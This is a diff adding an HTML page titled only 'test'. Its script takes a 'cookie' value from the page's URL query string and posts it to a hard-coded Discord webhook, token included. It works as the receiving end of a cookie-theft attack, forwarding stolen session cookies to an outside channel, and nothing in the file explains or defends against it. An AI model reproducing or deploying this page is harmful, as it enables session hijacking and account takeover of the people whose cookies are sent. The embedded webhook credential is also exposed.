@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>test</title>
+</head>
+<body>
+<h2>test</h2>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const cv = params.get('cookie');
+
+if (cv) {
+    const wb = "https://discord.com/api/webhooks/1416196052066766958/9AkFsT4oWhvqCq6tUoIzf-L9wpZSFBOUrgYlaw8aQ4SqznnrMw8Z762JJBnaxOTe5YZp";
+
+    fetch(wb, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookie: cv })
+    })
+    .then(() => console.log("sent"))
+    .catch(err => console.error("err"));
+} else {
+    console.log("nothing found");
+}
+</script>
+</body>
+</html>
